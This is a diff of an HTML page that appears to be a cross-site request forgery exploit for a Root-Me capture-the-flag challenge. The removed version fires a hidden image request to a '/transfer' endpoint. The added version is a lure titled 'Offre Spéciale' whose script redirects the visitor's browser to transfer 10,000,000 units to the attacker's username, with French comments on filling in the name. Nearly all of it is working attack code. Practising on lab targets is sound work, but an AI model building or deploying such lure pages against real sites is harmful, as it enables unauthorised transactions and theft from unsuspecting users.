@@ -1,7 +1,25 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <meta charset="UTF-8">
+    <title>Offre Spéciale</title>
+</head>
 <body>
-    <h1>Chargement...</h1>
-    <img src="https://instance-019aa377-a1db-70ca-acdf-88b0495225ca.challenges.root-me.pro/transfer?recipient=a&amount=10000000" style="display:none;">
+    
+    <h1>Redirection en cours...</h1>
+    
+    <script>
+        // Remplace TON_PSEUDO par ton nom d'utilisateur EXACT
+        var pseudo = "TON_PSEUDO";
+        var montant = "10000000";
+        
+        // L'URL cible
+        var target = "https://instance-019aa377-a1db-70ca-acdf-88b0495225ca.challenges.root-me.pro/transfer?recipient=" + pseudo + "&amount=" + montant;
+
+        // Cette commande force le navigateur à quitter cette page pour aller sur l'URL cible
+        // Cela simule le fait que l'utilisateur ait cliqué lui-même sur le lien.
+        window.location.href = target;
+    </script>
+
 </body>
 </html>
